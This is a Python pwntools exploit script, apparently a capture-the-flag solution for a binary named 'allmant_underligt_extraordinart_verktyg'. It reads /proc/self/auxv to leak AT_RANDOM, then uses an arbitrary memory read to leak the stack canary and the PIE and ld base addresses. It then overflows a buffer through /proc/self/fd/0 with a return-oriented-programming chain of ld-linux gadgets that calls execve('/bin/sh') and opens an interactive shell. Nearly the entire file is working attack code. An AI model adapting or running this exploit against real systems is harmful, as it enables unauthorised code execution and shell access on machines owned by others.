#!/usr/bin/python3

from pwn import *

p = process('./allmant_underligt_extraordinart_verktyg')
#p = remote('127.0.0.1', 3001)

# Leak files and analyze -- see exfil_files.py

# Leak AT_RANDOM addr via read_file("/proc/self/auxv")
p.sendlineafter('Choice: ', '1')
p.sendlineafter('Filename: ', '/proc/self/auxv')
p.sendlineafter('nr of bytes: ', str(144))
raw = p.recvuntil("EOF")
AT_RANDOM_addr = u32(raw[0x8c:0x90]) # This offset might be a bit system-dependent
print("Got canary addr", hex(AT_RANDOM_addr))

# Leak canary, pie, ld via read_mem(AT_RANDOM_addr-0x103)
p.sendlineafter('Choice: ', '2')
p.sendlineafter('Addr: ', hex(AT_RANDOM_addr-0x103)[2:])
raw = p.recvuntil("EOM")[:-3]
## Note! These offsets differ a bit depending on the running system
## You might have to do some debugging to get them right
canary = u32(raw[0x100+3:0x104+3]) & 0xffffff00
pie_leak = u32(raw[0x90:0x94]) 
ld_leak = u32(raw[0x80:0x84]) 
print("Got canary", hex(canary))
print("Got pie", hex(pie_leak))
print("Got ld", hex(ld_leak))

# Rop via read_file("/proc/self/fd/0")
p.sendlineafter('Choice: ', '1')
p.sendlineafter('Filename: ', '/proc/self/fd/0')
p.sendlineafter('nr of bytes: ', '-1')
#gdb.attach(p)
pad = b'A'*0x90

bss = pie_leak + 0x2e70

# ROP to execute SYS_execve("/bin/sh\0", NULL, NULL) using gadgets found in ld-linux.so.2
# (edx, i.e. const char __user *const __user *envp, is already 0 (NULL))
# Set ebx to valid memory addr in order to use the push esp gadget
    # pop ebx ; ret
# Set ebx to pointer to "/bin/sh" on stack
    # push esp ; xor eax, eax ; mov dword ptr [ebx + 0x50], edx ; pop ebx ; pop esi ; pop edi ; ret
# null out unused argument regs. set edi to syscall number so we can exchange it to eax
    # pop esi ; pop edi ; ret
# exchange edi, eax to get syscall number into eax
    # xchg edi, eax ; ret
    # or
    # xchg edi, eax ; mov esi, edx ; ret
# null out ecx (const char __user *const __user *argv) and perform syscall
    # xor ecx, ecx ; int 0x80


# local
#pop_ebx             = ld_leak + 0x0000237e
#push_esp_pop_ebx    = ld_leak + 0x00023b70
#pop_esi_pop_edi     = ld_leak + 0x00023b77
#xchg_edi_eax        = ld_leak + 0x00021b67
#xor_ecx_ecx_syscall = ld_leak + 0x000178cd

# remote
pop_ebx             = ld_leak + 0x0000236e
push_esp_pop_ebx    = ld_leak + 0x00023b00
pop_esi_pop_edi     = ld_leak + 0x00023b07
xchg_edi_eax        = ld_leak + 0x000249d2
xor_ecx_ecx_syscall = ld_leak + 0x0001785d

rop_chain = p32(pop_ebx) + \
            p32(bss+0x100) + \
            p32(push_esp_pop_ebx) + \
            b'/bin' + \
            b'/sh\0' + \
            p32(pop_esi_pop_edi) + \
            p32(0) + \
            p32(0xb) + \
            p32(xchg_edi_eax) + \
            p32(xor_ecx_ecx_syscall)

                              #word     #word       #ebp            #lr
payload = pad + p32(canary) + p32(0) + p32(0) + p32(bss+0x100) + rop_chain 
p.sendline(payload)
p.interactive()
